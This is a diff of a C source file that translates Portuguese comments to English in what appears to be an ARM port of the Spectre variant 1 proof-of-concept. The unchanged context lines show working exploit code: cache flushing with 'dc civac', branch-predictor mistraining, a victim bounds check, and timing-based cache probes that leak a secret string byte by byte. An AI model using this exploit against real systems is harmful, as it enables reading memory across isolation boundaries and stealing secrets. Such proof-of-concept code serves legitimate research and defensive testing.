@@ -2,12 +2,12 @@
 #include <unistd.h>
 
 unsigned int array1_size = 16;
-uint8_t unused1[64]; // Padding para evitar fetch de cache adjacente
+uint8_t unused1[64]; // Padding to avoid adjacent cache line fetch
 uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64]; 
 uint8_t array2[256 * 512];
 char *secret = "The Magic Words are Squeamish Ossifrage.";
-volatile uint8_t temp_spectre = 0; // Variável para evitar otimização do compilador
+volatile uint8_t temp_spectre = 0; // Variable to prevent compiler optimization
 
 void victim_function(size_t x) {
     if (x < array1_size) {
@@ -33,22 +33,22 @@ void read_memory_byte_spectre(int cache_hit_threshold, size_t malicious_x, uint8
 
         training_x = tries % array1_size;
         for (j = 29; j >= 0; j--) {
-            //flush array1_size para forçar execuçao especulativa no branch
+            //flush array1_size to force speculative execution on the branch
             __asm volatile("dc civac, %0" : : "r"(&array1_size) : "memory");
             
             //delay
             for (volatile int z = 0; z < 100; z++) {}
 
-            //treinamento do preditor
-            //x = training_x se j % 6 != 0, senão malicious_x
+            //branch predictor training
+            //x = training_x if j % 6 != 0, otherwise malicious_x
             x = ((j % 6) - 1) & ~0xFFFF;
             x = (x | (x >> 16));
             x = training_x ^ (x & (malicious_x ^ training_x));
 
-            victim_function(x); //chhama a função vítima
+            victim_function(x); //call the victim function
         }
 
-        //medicao de tempo
+        //time measurement
         for (i = 0; i < 256; i++) {
             mix_i = ((i * 167) + 13) & 255;
             addr = &array2[mix_i * 512];
@@ -76,7 +76,7 @@ void read_memory_byte_spectre(int cache_hit_threshold, size_t malicious_x, uint8
             break;
     }
 
-    //atribui os valores para que a task_spectre possa imprimir
+    //assign values so task_spectre can print them
     value[0] = (uint8_t)j;
     score[0] = results[j];
     value[1] = (uint8_t)k;
@@ -88,7 +88,7 @@ void execute_spectre_attack(int cache_hit_threshold, size_t starting_malicious_x
     int score[2];
     size_t current_x = starting_malicious_x;
 
-    //tenta extrair a quantidade de bytes definida
+    //try to extract the defined number of bytes
     for (int i = 0; i < bytes_to_read; i++) { 
         read_memory_byte_spectre(cache_hit_threshold, current_x++, value, score);
         
